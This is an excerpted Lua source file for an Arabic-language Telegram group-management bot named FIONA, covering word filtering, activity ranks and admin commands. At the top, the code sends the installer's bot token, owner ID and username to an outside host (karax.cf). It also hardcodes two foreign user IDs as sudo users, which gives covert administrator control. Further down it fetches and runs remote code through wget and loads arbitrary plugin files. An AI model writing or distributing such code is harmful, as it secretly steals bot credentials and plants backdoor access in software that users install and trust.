...
https.request('http://karax.cf/FIONA/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("FIONA", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/FIONA
token="]]..database:get(id_server..":token")..[["
...
sudo_users = {SUDO,717869155,873989134}   
...
var = true  
elseif tonumber(user_id) == tonumber(873989134) then
var = true  
...
local FIONA_Msg = ''  
if msgs < 100 then 
FIONA_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
FIONA_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
FIONA_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
FIONA_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
FIONA_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
FIONA_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
FIONA_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
FIONA_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
FIONA_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
FIONA_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
FIONA_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
FIONA_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
FIONA_Msg = 'رب التفاعل '  
end 
return FIONA_Msg 
end
...
function plugin_FIONAa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.FIONAa and msg then
pre_msg = plugin.FIONAa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceFIONA(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,FIONA_Msg) 
return false  
end 
if text then    
...
if text == 'السيرفر🔎' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local FIONA1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..FIONA1.server.uptime_in_days..'('..FIONA1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..FIONA1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..FIONA1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..FIONA1.stats.instantaneous_ops_per_sec..'`\n'
...
os.execute('wget https://raw.githubusercontent.com/FIONATEAM/FIONA/master/FIONA.lua')
...
send(msg.chat_id_, msg.id_,'📌┋ عدد المجموعات الان » { '..#group..' }'..FIONAk..''..FIONA..'\n*📌┋ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if FIONA_Msg and not Special(msg) then  
local FIONA_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if FIONA_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
⛓️⇗✰FIONA TEAM✰⇖⛓️
🇯🇵〰️〰️〰️〰️〰️〰️〰️〰️〰️🇮🇶
𖤤┊[Source Channel](t.me/tt_0tq) 🖤
𖤤┊[FIONA dev](t.me/Torito1990)🖤
𖤤┊[Source  Files](t.me/YS100k)🖤
𖤤┊[tws Source](t.me/FIONATWSbot)🖤
𖤤➖➖➖➖➖➖➖➖➖➖𖤤
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
database:set(bot_id.."FIONA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."FIONA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"☑️┋ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."FIONA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."FIONA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."FIONA1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."FIONA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖┋تم منع الكلمه مع التحذير")  
database:del(bot_id.."FIONA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."FIONA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."FIONA1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."FIONA1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖┋ارسل الكلمه الان")  
database:set(bot_id.."FIONA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."FIONA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."FIONA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."FIONA1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."FIONA1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."FIONA1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."FIONA1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."FIONA1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."FIONA1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔┋قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local FIONA_Msg = database:get(bot_id.."FIONA1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..FIONA_Msg.."}\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'['..FIONA_Msg[math.random(#FIONA_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فيونا').." غادر" or text == 'غادر' then  
...
-- vardump(data) 
FIONAdx(msg.chat_id_, msg.id_, '📤┋ ايدي المجموعة » ( '..msg.chat_id_..' )\n☑️┋ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛┋ عدد المحظورين » ( *'..data.kicked_count_..' )*\n😼✊🏿┊ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
FIONA = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(FIONA)
...
--------------------------------------------------------------------------------------------------------------
SourceFIONA(data.message_,data)
plugin_FIONAa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local FIONAAbot = database:get(bot_id.."FIONA1:Add:Filter:Rp2"..text..result.chat_id_)   
if FIONAAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┋العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┋["..FIONAAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local FIONA1_Msg = database:get(bot_id.."FIONA1:Add:Filter:Rp2"..text..result.chat_id_)   
if FIONA1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┋"..FIONA1_Msg)
